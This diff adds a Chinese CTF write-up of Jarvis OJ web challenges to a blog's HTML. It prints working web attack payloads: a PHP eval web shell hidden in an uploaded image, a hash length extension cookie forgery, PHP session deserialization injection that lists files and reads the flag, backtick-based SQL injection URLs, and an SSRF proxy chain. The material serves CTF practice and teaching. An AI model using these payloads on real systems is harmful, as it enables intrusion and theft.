+<h2 id="11-Easy-Gallery"><a href="#11-Easy-Gallery" class="headerlink" title="11. Easy Gallery"></a>11. Easy Gallery</h2><p><img src="/2019/04/03/Jarvis OJ web writeup/20.png" alt="在这里插入图片描述"><br>可见这道题目中应当涉及到了多种漏洞，首先gallery应当存在文件上传的功能，尝试一下制作一个一句话图片木马后使用菜刀连接，很可惜失败了。仔细观察一下网站的构架，其url形式为<code>http://web.jarvisoj.com:32785/index.php?page=view</code>,可能存在有任意文件读取的漏洞，，使用一句话<code>&lt;?php @eval($_POST[1])?&gt;</code>制作一句话图片木马进行上传，修改<code>?page</code>后的内容为<code>uploads/xxx.jpg</code>(xxx为图片的id)进行读取，得到错误信息<br><img src="/2019/04/03/Jarvis OJ web writeup/21.png" alt="在这里插入图片描述"><br>原来网站在进行处理的时候会自动加上<code>.php</code>，但是我们想要实现任意文件读取的的文件为<code>.jpg</code>结尾，此时使用<code>%00</code>截断进行绕过，payload:<code>uploads/xxx.jpg</code>,依旧没有得到flag……<br><img src="/2019/04/03/Jarvis OJ web writeup/22.png" alt="在这里插入图片描述"><br>考虑可能是我们的一句话中的内容被waf监测到，故修改一句话木马为<code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[1])&lt;/script&gt;</code>，重新制作一句话图片马，上传访问得到flag。</p>
+<h2 id="12-admin"><a href="#12-admin" class="headerlink" title="12. admin"></a>12. admin</h2><p>题目要求我们以admin的方式登陆来获得flag，值得注意的点是有两个可疑的cookie值，分别是hah和role<br><img src="/2019/04/03/Jarvis OJ web writeup/23.png" alt="在这里插入图片描述"><br>hah的长度为32，应当是经过hash函数加密的值，role则为guest的序列化输出，尝试将guest字符串md5加密，结果和hah的值并不相同。<br>考虑收集其余的资源，利用SourceLeakHacker进行源码泄露的探测<img src="/2019/04/03/Jarvis OJ web writeup/24.png" alt="在这里插入图片描述"><br>访问后得到源码<br><img src="/2019/04/03/Jarvis OJ web writeup/25.png" alt="在这里插入图片描述"><br>内容有点杂乱，整合一下：hah的值是由未知的<code>$salt</code>和cookie中的role值的逆置拼接起来并md5加密得到的，我们已经知道了<code>$salt</code>和guest序列化的值拼接后的md5值，很明显是一个利用hash函数拓展攻击解决的题目，使用hashpump(注意序列化后的逆置问题)<br><img src="/2019/04/03/Jarvis OJ web writeup/26.png" alt="在这里插入图片描述"><br>使用burp抓包修改role和hah的值，得到flag。</p>
+<h2 id="13-WEB"><a href="#13-WEB" class="headerlink" title="13. WEB?"></a>13. WEB?</h2><p>这道题真的是没看出来哪里有破绽，看了大佬们的博客之后才知道关键的问题出在<code>app.js</code>当中(orz)，这时我们随便在密码的输入框当中输入数据后得到报错的信息<code>Wrong Password!!</code>，在<code>app.js</code>当中搜索指定的字符串<img src="/2019/04/03/Jarvis OJ web writeup/27.png" alt="在这里插入图片描述"><br>得知了用于验证密码是否正确的<code>checkpass.json</code>，如果该json的返回值是true的话则返回成功。此时我们在<code>app.js</code>当中搜索<code>checkpass.json</code>后观察其结构<br>首先是两组数据o和r，然后是判断语句<br><img src="/2019/04/03/Jarvis OJ web writeup/28.png" alt="在这里插入图片描述"><br>可以判断出其是一个二十五元一次的方程组，如果我们输入的数据为方程组的解，则该json的返回值为1。在线解密一下<br><img src="/2019/04/03/Jarvis OJ web writeup/29.png" alt="在这里插入图片描述"><br><img src="/2019/04/03/Jarvis OJ web writeup/30.png" alt="在这里插入图片描述"><br>利用python脚本转化为char类型得到flag。</p>
+<h2 id="14-PHPINFO"><a href="#14-PHPINFO" class="headerlink" title="14.PHPINFO"></a>14.PHPINFO</h2><p>进入题目后看到了一段php语句。<br><img src="/2019/04/03/Jarvis OJ web writeup/31.png" alt="在这里插入图片描述"><br>可以看出有一个名为<code>OowoO</code>的类，内部有一个名为<code>mdzz</code>的公有成员属性，构造任意的<code>OowoO</code>类的对象时便会给此对象的<code>mdzz</code>属性赋值为<code>phpinfo();</code>,执行析构函数时则会调用<code>mdzz</code>，也就是展示<code>phpinfo</code>的内容。<br>题目的关键点在于开头的一句话当中<br><img src="/2019/04/03/Jarvis OJ web writeup/32.png" alt="在这里插入图片描述"><br>我们可以看到index.php当中使用的session序列化处理器是<code>php</code>，但是在<code>phpinfo()</code>当中session的序列化处理器则为<code>php_serialize</code>，之后的内容就需要学习一下了</p>
+<blockquote>
+<p><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="noopener">http://drops.wooyun.org/tips/3909</a></p>
+</blockquote>
+<p>漏洞出现在对于不同的序列化处理器，对应的有不同的处理格式，其中常见的有<br><img src="/2019/04/03/Jarvis OJ web writeup/33.png" alt="在这里插入图片描述"><br>此时我们存储session的序列化处理器采用的为<code>php_serialize</code>，如果我们传入的数据为<code>|O:8:&quot;stdClass&quot;:0:{}&#39;</code>，存储时采用的序列化处理器为<code>php_serialize</code>则存储的格式为<code>a:1:{s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:{}&quot;;}</code>，而此时我们读取时采用的序列化处理器为<code>php</code>,反序列化后的内容为<code>array(1) {
+  [&quot;a:1:{s:4:&quot;ryat&quot;;s:20:&quot;&quot;]=&gt;
+  object(stdClass)#1 (0) {}</code>，可以看出我们通过注入<code>|</code>后成功实现了对<code>stdClass</code>的实例化。但是题目本身并没有给我们利用该漏洞的机会，此时可以通过<code>Session Upload Progress</code>实现session的传入。<br> 学习资料：</p>
+<blockquote>
+<p><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO</a><br><a href="https://blog.csdn.net/wy_97/article/details/78430690" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78430690</a></p>
+</blockquote>
+<p>当一个上传在处理中，同时POST一个与ini中设置的session.upload_progress.name同名的变量时，当PHP检测到这种POST请求时，会在session中添加一组数据，因此可以通过<code>Session Upload Progress</code>来对session进行设置。<br>在本地创建index.html来实现对网站post和上传的同时进行。其内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">	    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">	    &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>此时只需要修改file的名称，便可以实现对于session的注入。<br>接下来就是对于<code>OowoO</code>类的序列化处理。首先读取当前的文件列表。<code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code><br>需要注意的是作为注入关键的<code>|</code>的补充和<code>&quot;</code>的转义问题，修改为<code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code><br>得到关键的文件名称：<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code><br><img src="/2019/04/03/Jarvis OJ web writeup/34.png" alt="在这里插入图片描述"><br>之后对其进行<code>print_r(file_get_contents())</code>读取，获得flag。<br><img src="/2019/04/03/Jarvis OJ web writeup/35.png" alt="在这里插入图片描述"></p>
+<h2 id="15-inject"><a href="#15-inject" class="headerlink" title="15.inject"></a>15.inject</h2><p>提示要先找到源码，使用源码泄露工具扫描一下<br><img src="/2019/04/03/Jarvis OJ web writeup/36.png" alt="在这里插入图片描述"><br>f12得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$table = $_GET[&apos;table&apos;]?$_GET[&apos;table&apos;]:&quot;test&quot;;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,&quot;desc `secret_&#123;$table&#125;`&quot;) or Hacker();</span><br><span class="line">$sql = &quot;select &apos;flag&#123;xxx&#125;&apos; from secret_&#123;$table&#125;&quot;;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line">echo $ret[0];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>题目的关键点在于闭合时使用的反引号和<code>desc</code>语句，对于<code>desc</code>语句，其可以执行两个参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;DESCRIBE | DESC&#125; tbl_name [col_name | wild]</span><br></pre></td></tr></table></figure>
+<p>我们可以通过闭合语句来进行注入，剩下的就和普通的注入相同了(需要注意的是<code>&#39;</code>被过滤了，查询列名时可以使用16进制编码进行绕过)，注入语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/?table=flag`%20`union%20select%20database()limit%201,1</span><br><span class="line">http://web.jarvisoj.com:32794/?table=test`%20`union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()limit%201,1</span><br><span class="line">http://web.jarvisoj.com:32794/?table=test`%20`union%20select%20flagUwillNeverKnow%20from%20secret_flag%20limit%201,1</span><br></pre></td></tr></table></figure>
+<p>库名：<code>61d300</code><br>表名：<code>secret_flag,secret_test</code><br>列名：<code>flagUwillNeverKnow</code></p>
+<h2 id="16-Chopper"><a href="#16-Chopper" class="headerlink" title="16. Chopper"></a>16. Chopper</h2><p>选择以管理员身份登陆，被告知不是admin,f12查看源码后得到提示<code>admin ip is 202.5.19.128</code><br>想当然的使用了X-Forwarded-For和Client-Ip后均失败。查看网站首页的图片，观察到菜刀图片的url为<code>proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</code>考虑到问题的关键可能是在此处修改ip地址后对admin页面进行访问，payload:<code>proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code>得到提示<br><img src="/2019/04/03/Jarvis OJ web writeup/37.png" alt="在这里插入图片描述"><br>之后查看robots.txt，得到了关键的网页<br><img src="/2019/04/03/Jarvis OJ web writeup/38.png" alt="在这里插入图片描述"><br>访问第一个没有响应，再访问第二个，也就是第一个网页相关的代码。是一大堆看不懂的颜文字，复制到本地运行一下<br><img src="/2019/04/03/Jarvis OJ web writeup/39.png" alt="在这里插入图片描述"><br>也就是说我们post的360会以eval的方式被执行，我们选择post进去一个<code>phpinfo()</code>，得到flag。</p>
 
       
 
@@ -252,7 +325,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/29/TAMUCTF2019 web writeup/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/04/03/Jarvis OJ web writeup/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -266,18 +339,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/03/29/HGAME 2019 WEB week2/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          HGAME 2019 WEB week2
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/03/29/加了料的报错注入/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">加了料的报错注入(实验吧)</div>
+    <a href="/2019/03/29/HGAME2019-happyPython/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HGAME2019 happyPython</div>
       <i class="icon-circle-right"></i>
     </a>
   
